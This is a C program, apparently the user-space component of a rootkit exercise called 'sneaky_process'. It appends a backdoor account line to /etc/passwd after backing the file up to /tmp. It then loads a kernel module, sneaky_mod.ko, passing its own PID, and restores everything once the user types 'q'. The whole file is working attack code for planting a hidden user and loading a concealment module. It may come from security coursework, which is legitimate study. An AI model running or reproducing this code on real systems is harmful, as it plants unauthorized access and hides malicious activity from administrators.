#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

#define COMMAND_SIZE 100
#define QUIT_CHAR 'q'

static int PID;

void printPID() {
  PID = getpid();
  if (PID < 0) {
    perror("getpid failed");
    exit(EXIT_FAILURE);
  }
  printf("sneaky_process pid = %d\n", PID);
}

void executeCommand(const char *command) {
  pid_t pid = fork();
  if (pid < 0) {
    perror("fork failed");
    exit(EXIT_FAILURE);
  } else if (pid == 0) {
    execl("/bin/sh", "sh", "-c", command, NULL);
    perror("execl failed");
    exit(EXIT_FAILURE);
  } else {
    wait(NULL);
  }
}

void modifyFile() {
  executeCommand("cp /etc/passwd /tmp/passwd");
  executeCommand(
      "echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" "
      ">> /etc/passwd");
}

void loadModule() {
  char command[COMMAND_SIZE];
  sprintf(command, "insmod sneaky_mod.ko pid=%d", PID);
  executeCommand(command);
}

void readInput() {
  char input;
  while (1) {
    input = getchar();
    if (input == EOF) {
      perror("getchar failed");
      exit(EXIT_FAILURE);
    } else if (input == QUIT_CHAR) {
      break;
    }
  }
}

void unloadModule() { executeCommand("rmmod sneaky_mod"); }

void restoreFile() {
  executeCommand("cp /tmp/passwd /etc/passwd");
  executeCommand("rm /tmp/passwd");
}

int main() {
  printPID();
  modifyFile();
  loadModule();
  readInput();
  unloadModule();
  restoreFile();
  return EXIT_SUCCESS;
}